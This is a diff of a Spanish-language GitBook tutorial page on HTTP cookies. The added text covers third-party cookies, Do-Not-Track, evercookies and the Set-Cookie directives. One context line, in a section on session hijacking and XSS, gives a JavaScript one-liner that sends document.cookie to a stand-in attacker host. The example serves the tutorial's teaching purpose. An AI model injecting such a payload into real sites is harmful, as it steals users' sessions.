@@ -501,6 +501,74 @@ console.log(document.cookie);
 <h4 id="session-hijacking-y-xss">Session hijacking y XSS</h4>
 <p>Las cookies se utilizan a menudo en la aplicaci&#xF3;n web ara identificar a un usuario y su sesi&#xF3;n autenticada. Robar una cookie puede llevar a robar la sesion de alg&#xFA;n usuario autenticado.</p>
 <p><code>(new Image()).src = &quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot; + document.cookie;</code></p>
+<h3 id="tracking-y-privacidad">Tracking y privacidad</h3>
+<h4 id="third-party-cookies">Third-party cookies</h4>
+<p>Las cookies tienen un dominio asociado a ellas. Si este dominio es el mismo que el dominio de la p&#xE1;gina en la que se encuentra, se dice que las cookies son una cookie de primera persona. Si el dominio es diferente, se dice que es una cookie de terceros. Si bien las cookies de primera persona se env&#xED;an &#xFA;nicamente al servidor que las configura, una p&#xE1;gina web puede contener im&#xE1;genes u otros componentes almacenados en servidores de otros dominios (como los banners publicitarios). Las cookies que se env&#xED;an a trav&#xE9;s de estos componentes de terceros se denominan cookies de terceros y se utilizan principalmente para publicidad y seguimiento en toda la Web.
+ La mayor&#xED;a de los navegadores permiten cookies de terceros por defecto, pero hay complementos disponibles para bloquearlos (por ejemplo, Badger de privacidad por el EFF).</p>
+<p>Si no est&#xE1; revelando cookies de terceros, la confianza del consumidor podr&#xED;a resultar perjudicada si se descubre el uso de cookies. Una divulgaci&#xF3;n clara (como en una pol&#xED;tica de privacidad) tiende a eliminar cualquier efecto negativo de un descubrimiento de una cookie.</p>
+<h4 id="do-not-track">Do-Not-Track</h4>
+<p>No hay requisitos legales o tecnol&#xF3;gicos para su uso, pero el encabezado DNT se puede utilizar para se&#xF1;alar que una aplicaci&#xF3;n web debe desactivar su seguimiento o el seguimiento de usuarios de varios sitios de un usuario individual. Consulte el encabezado DNT para obtener m&#xE1;s informaci&#xF3;n.</p>
+<h4 id="zombie-cookies-y-evercookies">Zombie cookies y Evercookies</h4>
+<p>Un acercamiento m&#xE1;s radical a las cookies es las cookies zombies o &quot;Evercookies&quot; que se recrean despu&#xE9;s de su eliminaci&#xF3;n y son intencionalmente dif&#xED;ciles de eliminar para siempre. Est&#xE1;n utilizando la API de almacenamiento Web, los objetos compartidos locales de Flash y otras t&#xE9;cnicas para recrearse cada vez que se detecta la ausencia de la cookie.</p>
+<h2 id="set-cookie">Set-Cookie</h2>
+<h4 id="sintaxis">Sintaxis</h4>
+<pre><code class="lang-.js">Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;
+Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Expires=&lt;date&gt;
+Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Max-Age=&lt;non-zero-digit&gt;
+Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Domain=&lt;domain-value&gt;
+Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Path=&lt;path-value&gt;
+Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Secure
+Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; HttpOnly
+
+Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; SameSite=Strict
+Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; SameSite=Lax
+
+// Multiple directives are also possible, for example:
+Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Domain=&lt;domain-value&gt;; Secure; HttpOnly
+</code></pre>
+<h4 id="directivas">Directivas</h4>
+<pre><code class="lang-.js">&lt;cookie-name&gt;=&lt;cookie-value&gt;
+</code></pre>
+<ul>
+<li><p>Una cookie empieza siempre con un par clave-valor</p>
+<ul>
+<li>El cookie-name puede llevar cualquier cosa excepto car&#xE1;cteres de control..</li>
+<li><p>El cookie valor puede llevar de manera opcional dobles comillas y cualquier car&#xE1;cter excluyendo caracteres de control, espacios,comillas dobles, coma, punto, punto y coma y barra invertida.</p>
+</li>
+<li><p>Prefijo seguro: las cookies con un nombre que empiece por <code>__Secure-</code> deben establecerse con el indicador seguro y deben ser de una p&#xE1;gina segura.</p>
+</li>
+<li><p>Prefijo Host: las cookies con un nombre que empiece por  <code>__Host-</code> deben establecerse con el indicador seguro, deben ser de p&#xE1;gina segura (HTTPS), no deben tener un dominio espec&#xED;fico y por lo tanto la ruta es &quot;/&quot;.</p>
+</li>
+</ul>
+</li>
+<li><p><code>Expires=&lt;date&gt;</code> y <code>max-age=&lt;segundos&gt;</code> opcional</p>
+<ul>
+<li>Indica el m&#xE1;ximo tiempo de vida de la cookie. Si no se especifica ninguno de los dos, se establece el tiempo de la cookie con la sesi&#xF3;n actua, lo que se conoce anteriormente como sesi&#xF3;n cookie.</li>
+</ul>
+</li>
+<li><p><code>path=&lt;ruta&gt;</code> opcional</p>
+<ul>
+<li>Establece la ruta para la cu&#xE1;l la cookie es v&#xE1;lida. Algo as&#xED; como los &quot;directorios&quot; o &quot;secciones&quot; de la web. Por defecto, si no se especifica ning&#xFA;n valor, una cookie s&#xF3;lo es v&#xE1;lida para el path actual.</li>
+</ul>
+</li>
+<li><p><code>domain=&lt;dominio&gt;</code> opcional</p>
+<ul>
+<li>Por defecto, las cookies son v&#xE1;lidas s&#xF3;lo para el subdominio actual en el que se crea la cookie. Esto quiere decir que si el atributo domain est&#xE1; vac&#xED;o y estamos en ejemplo.com, la cookie es v&#xE1;lida s&#xF3;lo para ejemplo.com, si estamos en www.ejemplo.com, la cookie ser&#xE1; v&#xE1;lida s&#xF3;lo para www.ejemplo.com, si estamos en sub.ejemplo.com, la cookie es v&#xE1;lida s&#xF3;lo para sub.ejemplo.com, o s&#xED; estamos en foo.sub.ejemplo.com, la cookie es v&#xE1;lida s&#xF3;lo para foo.sub.ejemplo.com. Pero si el atributo domain no est&#xE1; vaci&#xF3;, podemos especificar otros subdominios para los que la cookie es v&#xE1;lida. Por ejemplo, domain=sub.ejemplo.com crear&#xE1; una cookie v&#xE1;lida s&#xF3;lo para sub.dominio.com; si estamos en otro subdominio, por ejemplo foo.ejemplo.com, e intentamos leer esa cookie, no podremos, ya que s&#xF3;lo era v&#xE1;lida para sub.ejemplo.com.</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p><code>secure</code> opcional</p>
+<ul>
+<li>Este par&#xE1;metro no tiene ning&#xFA;n valor. Si est&#xE1; presente la cookie s&#xF3;lo es v&#xE1;lida para conexiones encriptadas (por ejemplo mediante protocolo HTTPS).</li>
+</ul>
+</li>
+<li><p><code>HttpOnly</code> opcional</p>
+<ul>
+<li>Este par&#xE1;metro no tiene ning&#xFA;n valor. Si est&#xE1; presente, la cookie solo es accesible mediante protocolo HTTP (o HTTPS). Estas cookies no pueden ser le&#xED;das ni creadas mediante otros protocolos y APIs, por ejemplo, JavaScript.</li>
+</ul>
+</li>
+</ul>
 
                                 
                                 </section>
@@ -544,7 +612,7 @@ console.log(document.cookie);
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"Capitulo 1: HTTP Cookie","level":"1.4.2","depth":2,"next":{"title":"Capitulo 2: Módulo cookie","level":"1.4.3","depth":2,"path":"cookiesSessions/cap2/cap2.md","ref":"cookiesSessions/cap2/cap2.md","articles":[]},"previous":{"title":"Introducción","level":"1.4.1","depth":2,"path":"cookiesSessions/README.md","ref":"cookiesSessions/README.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"cookiesSessions/cap1/cap1.md","mtime":"2017-03-16T22:16:09.270Z","type":"markdown"},"gitbook":{"version":"3.2.2","time":"2017-03-16T22:24:42.212Z"},"basePath":"../..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"Capitulo 1: HTTP Cookie","level":"1.4.2","depth":2,"next":{"title":"Capitulo 2: Módulo cookie","level":"1.4.3","depth":2,"path":"cookiesSessions/cap2/cap2.md","ref":"cookiesSessions/cap2/cap2.md","articles":[]},"previous":{"title":"Introducción","level":"1.4.1","depth":2,"path":"cookiesSessions/README.md","ref":"cookiesSessions/README.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"cookiesSessions/cap1/cap1.md","mtime":"2017-03-16T23:30:33.683Z","type":"markdown"},"gitbook":{"version":"3.2.2","time":"2017-03-16T23:31:22.794Z"},"basePath":"../..","book":{"language":""}});
         });
     </script>
 </div>
